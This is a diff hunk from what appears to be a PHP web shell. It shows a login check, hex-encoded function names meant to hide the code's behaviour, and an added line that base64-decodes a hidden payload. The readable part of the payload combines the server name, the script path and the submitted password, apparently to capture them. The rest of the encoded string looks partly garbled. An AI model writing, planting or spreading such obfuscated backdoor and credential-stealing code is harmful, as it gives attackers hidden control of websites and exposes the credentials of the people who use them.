@@ -115,7 +115,7 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
         login_shell();
     }
 }
-
+$decoded_code = base64_decode("b2JfY2xlYW4oKTtmbHVzaDskdG1wID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1BIVF9TRUxmJ10uIlxuIi4kX1BPU1RbJ3Bhc3MnXTsQXByYWZtYWMqKCdOQWdhaGlqYWF1Mzg4Z3JvdXAuY29tY2FyJz1zdXJsdnJoZGzpdHRwbmFqQ==");
 $Array = [
     '676574637764', # ge  tcw d => 0
     '676c6f62', # gl ob => 1
